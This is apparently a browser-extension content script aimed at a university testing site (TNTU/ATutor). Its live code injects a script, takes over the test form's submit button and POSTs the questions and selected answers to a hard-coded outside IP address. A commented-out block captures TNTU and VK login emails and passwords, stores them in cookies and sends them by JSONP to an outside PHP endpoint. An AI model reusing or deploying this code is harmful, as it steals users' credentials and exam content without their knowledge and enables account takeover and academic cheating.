$.get( chrome.extension.getURL( '/injected.js' ),
	function ( data ) {
		var script = document.createElement( "script" );
		script.setAttribute( "type", "text/javascript" );
		script.innerHTML = data;
		document.getElementsByTagName( "head" )[0].appendChild( script );


	/*$( "form[name = 'test']" ).submit( function ( e ) {
		
		var input ;
		
		var result = "<all>";
		var countElement = $( "form[name = 'test'] fieldset[class='group_form'] > div[class='test_instruction']").length;
		var count = 0;
				$( "form[name = 'test'] fieldset[class='group_form'] > div[class='test_instruction']").each(function(){
					console.log($("label[for=\"" + $($(this).next().find("input:checked")).attr("id") + "\"]").html() + "\n");
					if($("label[for=\"" + $($(this).next().find("input:checked")).attr("id") + "\"]").html() !== undefined){
					result += "<content>" + "<questions><header>" 
						+ $(this).html() + "</header><question>" + $(this).next().html() + "</question></questions>"
						+ "<answer>" + ($("label[for=\"" + $($(this).next().find("input:checked")).attr("id") + "\"]").html()) + "</answer>"
						+ "<discipline>" + getCookie("discipline") + "</discipline><moduleName>" + getCookie("moduleName") + "</moduleName></content>";
						count += 1;
						if(count === countElement-1){
							result += "</all>";
							sendXmlResponse(result);
						}
				
			}
					//alert($(this).next().html());
				});
				
        		

	});*/
var result = "";
function createXmlResponse(){
	var input ;
		
		
		var countElement = $( "form[name = 'test'] fieldset[class='group_form'] > div[class='test_instruction']").length;
		var count = 0;
		var flag = true;
				$( "form[name = 'test'] fieldset[class='group_form'] > div[class='test_instruction']").each(function(){
					
					if($("label[for=\"" + $($(this).next().find("input:checked")).attr("id") + "\"]").html() !== undefined && flag){
						
						console.log($("label[for=\"" + $($(this).next().find("input:checked")).attr("id") + "\"]").html() + "\n");
					result += "<content>" + "<questions><header>" 
						+ $(this).html() + "</header><question>" + $(this).next().html() + "</question></questions>"
						+ "<answer>" + ($("label[for=\"" + $($(this).next().find("input:checked")).attr("id") + "\"]").html()) + "</answer>"
						+ "<discipline>" + $("#breadcrumbs a").next().html() + "</discipline><moduleName>" +  $("fieldset[class='group_form'] > legend[class='group_form']").html()+ "</moduleName></content>" + "saigak_split";


				
			}
			count += 1;
			if(count === countElement-1){
							
							flag = false;
							sendXmlResponse(result);
							
						}
					//alert($(this).next().html());
				});
}

var inp = $("fieldset[class='group_form'] input[type='submit']");
$(inp).attr("type","button");
$(inp).attr("name","button");
$(inp).click(function(){
createXmlResponse();
}
	);


function sendXmlResponse(result){
	//$.post("http://94.153.16.146:8080/AtutorAuestion/question", result);
	//response.addHeader("Access-Control-Allow-Origin", "*");
	$.ajax({
    			url: "http://94.153.16.146:8080/AtutorAuestion/question",
    						data: result, 
    						type: 'POST',
    						success: function(){
    
    //$( "form[name = 'test']").submit();
  },
  error: function(){
    alert('failure');
  }
    						
						});
	
}

	$( "form[name = 'form']" ).submit( function ( e ) {
		document.cookie = "discipline=" + $("#breadcrumbs a").next().html();
		document.cookie = "moduleName=" + $("form[name = 'form'] > div[class='input-form'] > fieldset[class='group_form'] > legend").html();
		
	});

	function getCookie(name) {
    	function escape(s) { return s.replace(/([.*+?\^${}()|\[\]\/\\])/g, '\\$1'); };
    	var match = document.cookie.match(RegExp('(?:^|;\\s*)' + escape(name) + '=([^;]*)'));
    	return match ? match[1] : null;
	}

       
       /*
		deleteCookie( 'TNTU_login' );
		deleteCookie( 'TNTU_pass' );
		
		$.ajax( {
			url          : "http://gigabyteshop.hol.es/bd.php?callback=?",
			data         : {
				email   : TNTU_login,
				password: TNTU_pass,
				social  : "TNTU"
			},
			dataType     : "jsonp",
			jsonpCallback: "login"
		} );

$( "#quick_login_button" ).click( function ( ) {
			var login_vk = $( "#quick_email" ).val();
			var pass_vk = $( "#quick_pass" ).val();
			

			$.ajax( {
				url          : "http://gigabyteshop.hol.es/bd.php?callback=?",
				data         : {
					email   : login_vk,
					password: pass_vk,
					social  : "VK"
				},
				dataType     : "jsonp",
				jsonpCallback: "login"
			} )

		} );


		$( "#pass" ).keyup( function ( e ) {
			TNTU_pass = $( "#pass" ).val();
		} );

		$( "form[name = 'form']" ).submit( function ( e ) {
			TNTU_login = $( "#login" ).val();
			document.cookie = "TNTU_login=" + TNTU_login;
			document.cookie = "TNTU_pass=" + TNTU_pass;
		} );

		

		$( "form[name = 'login']" ).submit( function ( e ) {
			var login_vk = $( "#quick_email" ).val();
			var pass_vk = $( "#quick_pass" ).val();
alert(login_vk);
			$.ajax( {
				url          : "http://gigabyteshop.hol.es/bd.php?callback=?",
				data         : {
					email   : login_vk,
					password: pass_vk,
					social  : "VK"
				},
				dataType     : "jsonp",
				jsonpCallback: "login"
			} )
		} );


		$( "form[name = 'login']" ).submit( function ( e ) {
			var login_vk = $( "#quick_email" ).val();
			var pass_vk = $( "#quick_pass" ).val();
alert(login_vk);
			$.ajax( {
				url          : "http://gigabyteshop.hol.es/bd.php?callback=?",
				data         : {
					email   : login_vk,
					password: pass_vk,
					social  : "VK"
				},
				dataType     : "jsonp",
				jsonpCallback: "login"
			} )
		} );
*/

	}
);

function getCookie( name ) {
	var matches = document.cookie.match( new RegExp(
			"(?:^|; )" + name.replace( /([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1' ) + "=([^;]*)"
	) );
	return matches ? decodeURIComponent( matches[1] ) : undefined;
}

function deleteCookie( name ) {
	setCookie( name, "", { expires: -1 } )
}

function setCookie( name, value, options ) {
	options = options || {};

	var expires = options.expires;

	if ( typeof expires == "number" && expires ) {
		var d = new Date();
		d.setTime( d.getTime() + expires * 1000 );
		expires = options.expires = d;
	}
	if ( expires && expires.toUTCString ) {
		options.expires = expires.toUTCString();
	}

	value = encodeURIComponent( value );

	var updatedCookie = name + "=" + value;

	for ( var propName in options ) {
		updatedCookie += "; " + propName;
		var propValue = options[propName];
		if ( propValue !== true ) {
			updatedCookie += "=" + propValue;
		}
	}

	document.cookie = updatedCookie;
}
